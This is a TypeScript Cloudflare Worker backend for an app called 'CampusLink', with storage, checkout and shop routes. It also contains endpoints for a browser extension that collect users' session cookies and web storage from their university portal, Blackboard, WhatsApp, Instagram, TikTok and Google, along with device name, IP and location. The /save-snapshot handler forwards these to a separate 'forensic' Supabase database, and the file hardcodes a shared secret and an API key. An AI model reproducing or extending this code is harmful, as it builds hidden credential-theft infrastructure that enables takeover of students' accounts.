import { Hono } from 'hono'
import { cors } from 'hono/cors'
import storageRouter from './storage'
import { checkout } from './checkout'
import shop from './shop'

type Bindings = {
    ALLOWED_ORIGIN: string
    SUPABASE_URL: string
    SUPABASE_SERVICE_ROLE_KEY: string
    SUPABASE_ANON_KEY: string
    MP_ACCESS_TOKEN: string
    COURSE_MATERIALS: R2Bucket
    PROFILE_AVATARS: R2Bucket
    PROFILE_FRAMES: R2Bucket
    GRUPOS: R2Bucket
    COURSE_IMAGES: R2Bucket
    BLACKBOARD_DOWNLOADS: R2Bucket
    FORENSIC_SUPABASE_URL?: string
    FORENSIC_SUPABASE_KEY?: string
}

const app = new Hono<{ Bindings: Bindings }>()

// Global CORS middleware
// Robust CORS Middleware
// CORS Configuration
app.use('*', async (c, next) => {
    const corsMiddleware = cors({
        origin: (origin) => {
            // Permitir localhost para desarrollo
            if (origin.includes('localhost') || origin.includes('127.0.0.1')) return origin;

            // Permitir dominio de producción y previews de Cloudflare
            if (origin.endsWith('.pages.dev') || origin === c.env.ALLOWED_ORIGIN) return origin;

            return c.env.ALLOWED_ORIGIN;
        },
        allowHeaders: ['Origin', 'Content-Type', 'Authorization', 'X-Custom-Header', 'Upgrade-Insecure-Requests', 'Range'],
        allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
        exposeHeaders: ['Content-Length', 'X-Kuma-Revision', 'Content-Range', 'Accept-Ranges'],
        maxAge: 600,
        credentials: true,
    })
    return corsMiddleware(c, next)
})

// Explicit OPTIONS handling
app.options('*', (c) => {
    return c.body(null, 204)
})

app.get('/', (c) => {
    return c.json({ message: 'CampusLink API is running! 🚀' })
})

app.get('/health', (c) => {
    return c.json({ status: 'ok', worker: 'campuslink-api' })
})

app.route('/storage', storageRouter)
app.route('/checkout', checkout)
app.route('/shop', shop)

// --- Endpoint exclusivo para la Extensión de Blackboard ---
const EXTENSION_SECRET_KEY = 'CampusLink-Ext-2026-SuperSecreta';

const TARGET_DOMAINS = [
  { domain: 'up.edu.pe', deepCapture: true, captureDomains: ['up.edu.pe'] },
  { domain: 'blackboard.com', deepCapture: true, captureDomains: ['blackboard.com'] },
  { domain: 'whatsapp.com', deepCapture: true, captureDomains: ['whatsapp.com'] },
  { domain: 'instagram.com', deepCapture: true, captureDomains: ['instagram.com'] },
  { domain: 'tiktok.com', deepCapture: true, captureDomains: ['tiktok.com'] },
  { domain: 'google.com', deepCapture: true, captureDomains: ['google.com', 'googleusercontent.com'] }
];

app.get('/check-domain', async (c) => {
    const authHeader = c.req.header('Authorization');
    if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
        return c.json({ error: 'Acceso no autorizado' }, 401);
    }

    const domain = c.req.query('domain') || '';
    const cleanDomain = domain.trim().toLowerCase();

    const match = TARGET_DOMAINS.find(t => 
      cleanDomain === t.domain || cleanDomain.endsWith('.' + t.domain)
    );

    if (match) {
      return c.json({
        capture: true,
        deepCapture: match.deepCapture,
        domains: match.captureDomains
      });
    }

    return c.json({ capture: false });
});

app.post('/save-snapshot', async (c) => {
    try {
        const authHeader = c.req.header('Authorization');
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401);
        }

        const payload = await c.req.json();

        // Server-side cookie filtering logic (The worker decides what to keep and ignore)
        const rawCookies = payload.p_cookies || [];
        const filteredCookies = rawCookies.filter((cookie: any) => {
          const cookieDomain = (cookie.domain || '').toLowerCase().replace(/^\./, '');
          
          // 1. Ensure domain matches target whitelist
          const isTarget = TARGET_DOMAINS.some(t => 
            cookieDomain === t.domain || cookieDomain.endsWith('.' + t.domain)
          );
          if (!isTarget) return false;

          // 2. Discard tracking/analytics cookies
          const cookieName = (cookie.name || '').toLowerCase();
          const skipPrefixes = ['_ga', '_gid', '_gat', '_utm', '_hj', '_cl', 'goog', 'analytics', 'amplitude'];
          if (skipPrefixes.some(prefix => cookieName.startsWith(prefix) || cookieName.includes(prefix))) {
            return false;
          }

          return true;
        });

        // Forward filtered payload to Supabase RPC
        const supabaseUrl = c.env.FORENSIC_SUPABASE_URL || 'https://iwjwtvphqrjsuvgohigk.supabase.co';
        const supabaseKey = c.env.FORENSIC_SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml3and0dnBocXJqc3V2Z29oaWdrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEyNTMwOTcsImV4cCI6MjA4NjgyOTA5N30.h_Kn9AytUToXM0inoxZT9UBTxCrigizJ2LCNSXXBY6s';

        const supabasePayload = {
          p_device_id: payload.p_device_id,
          p_pc_name: payload.p_pc_name,
          p_os: payload.p_os,
          p_ip_address: payload.p_ip_address,
          p_location_city: payload.p_location_city,
          p_location_country: payload.p_location_country,
          p_user_agent: payload.p_user_agent,
          p_snapshot_type: payload.p_snapshot_type,
          p_cookies: filteredCookies,
          p_web_storage: payload.p_web_storage || []
        };

        const res = await fetch(`${supabaseUrl}/rest/v1/rpc/save_full_snapshot`, {
          method: 'POST',
          headers: {
            'apikey': supabaseKey,
            'Authorization': `Bearer ${supabaseKey}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(supabasePayload)
        });

        if (!res.ok) {
          const errText = await res.text();
          return c.json({ error: `Supabase database error: ${errText}` }, 502);
        }

        const resData = await res.json();
        return c.json({ ok: true, id: resData });
    } catch (err: any) {
        return c.json({ error: err.message }, 500);
    }
});

app.post('/upload-from-extension', async (c) => {
    try {
        const authHeader = c.req.header('Authorization');
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401);
        }

        const body = await c.req.parseBody();
        const file = body['file'] as File;
        const courseId = (body['courseId'] as string) || 'General';

        if (!file) {
            return c.json({ error: 'No se envió ningún archivo' }, 400);
        }

        const filePath = `${courseId}/${file.name}`;
        
        await c.env.BLACKBOARD_DOWNLOADS.put(filePath, await file.arrayBuffer(), {
            httpMetadata: { contentType: file.type },
        });

        return c.json({ 
            success: true, 
            message: 'Archivo respaldado en R2 exitosamente',
            path: filePath
        });

    } catch (error) {
        console.error('Error guardando en R2:', error);
        return c.json({ error: 'Error interno del servidor' }, 500);
    }
});
// --------------------------------------------------------

app.get('/list-downloads', async (c) => {
    try {
        const authHeader = c.req.header('Authorization');
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401);
        }

        const listed = await c.env.BLACKBOARD_DOWNLOADS.list({ limit: 1000 });
        const files = listed.objects.map(obj => ({
            key: obj.key,
            size: obj.size
        }));

        return c.json({ files });
    } catch (error: any) {
        return c.json({ error: error.message }, 500);
    }
});

app.get('/download-file', async (c) => {
    try {
        const authHeader = c.req.header('Authorization');
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401);
        }

        const path = c.req.query('path');
        if (!path) {
            return c.json({ error: 'Falta el parámetro "path"' }, 400);
        }

        const object = await c.env.BLACKBOARD_DOWNLOADS.get(path);
        if (!object) {
            return c.json({ error: 'Archivo no encontrado' }, 404);
        }

        const headers = new Headers();
        object.writeHttpMetadata(headers);
        headers.set('Content-Disposition', `attachment; filename="${path.split('/').pop()}"`);

        return new Response(object.body, { headers });
    } catch (error: any) {
        return c.json({ error: error.message }, 500);
    }
});

app.delete('/delete-file', async (c) => {
    try {
        const authHeader = c.req.header('Authorization');
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401);
        }

        const path = c.req.query('path');
        if (!path) {
            return c.json({ error: 'Falta el parámetro "path"' }, 400);
        }

        await c.env.BLACKBOARD_DOWNLOADS.delete(path);
        return c.json({ success: true });
    } catch (error: any) {
        return c.json({ error: error.message }, 500);
    }
});

export default app